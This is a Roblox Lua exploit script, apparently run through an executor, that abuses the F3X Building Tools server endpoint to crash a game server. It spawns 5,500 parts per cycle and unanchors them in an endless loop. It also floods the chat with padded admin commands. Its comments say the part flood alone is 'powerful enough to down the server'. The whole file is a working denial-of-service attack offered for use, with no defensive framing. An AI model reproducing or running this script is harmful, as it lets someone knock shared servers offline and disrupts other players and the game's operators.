-- this is best used when u startergive urself building tools, but does work perfectly fine without it

local function equip()
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
		task.spawn(function()
			if v:IsA'Tool' then
				v.Parent = game.Players.LocalPlayer.Character
			end
		end)
	end
end

if game.Players.LocalPlayer.Backpack:FindFirstChild("Building Tools") or game.Players.LocalPlayer.Character:FindFirstChild("Building Tools") then
    --equip()
else
    game.Players:Chat("btools me                                                                                                    fuck")
    game.Players:Chat("givetools/me                                                                                                    fuck")
    --game.Players.LocalPlayer.Backpack:WaitForChild("Building Tools")
    --equip()
end
wait(0.5)
task.delay(5, function() -- remove this entire part if u don't wanna use commands. the f3x crash alone should be powerful enough to down the server on its own
	for i = 1, 100 do
		game.Players:Chat("swag                                                                                                    all all all all fuck")
	end
	while task.wait() do
		game.Players:Chat("swag                                                                                                    all all all all fuck")
	end
end)
while true do
PartTable = {}
game.Workspace.ChildAdded:Connect(function(v)
    if v:IsA('Part') then
        table.insert(PartTable,v)
        --print(v.Name)
        end
    end)
for i = 1,5500 do
local args = {
    [1] = "CreatePart",
    [2] = "Normal",
    [3] = CFrame.new(Vector3.new(-112.61819458007812, 20.000003814697266, 80.5723876953125), Vector3.new(-0, -0, -1)),
    [4] = workspace
}
task.spawn(function()
game:GetService("Players").LocalPlayer.Backpack:WaitForChild("Building Tools"):WaitForChild("SyncAPI"):WaitForChild("ServerEndpoint"):InvokeServer(unpack(args))
end)
end
wait(0.5)
for i,v in pairs(PartTable) do
   local args = {
    [1] = "SyncAnchor",
    [2] = {
        [1] = {
            ["Part"] = v,
            ["Anchored"] = false
        }
    }
}
task.spawn(function()
game:GetService("Players").LocalPlayer.Backpack:WaitForChild("Building Tools"):WaitForChild("SyncAPI"):WaitForChild("ServerEndpoint"):InvokeServer(unpack(args))
 end)
end
wait(3.5) -- reduce this wait time a tiny bit if ur not using the swag crash. this is mainly just for stability since my executor keeps crashing
end
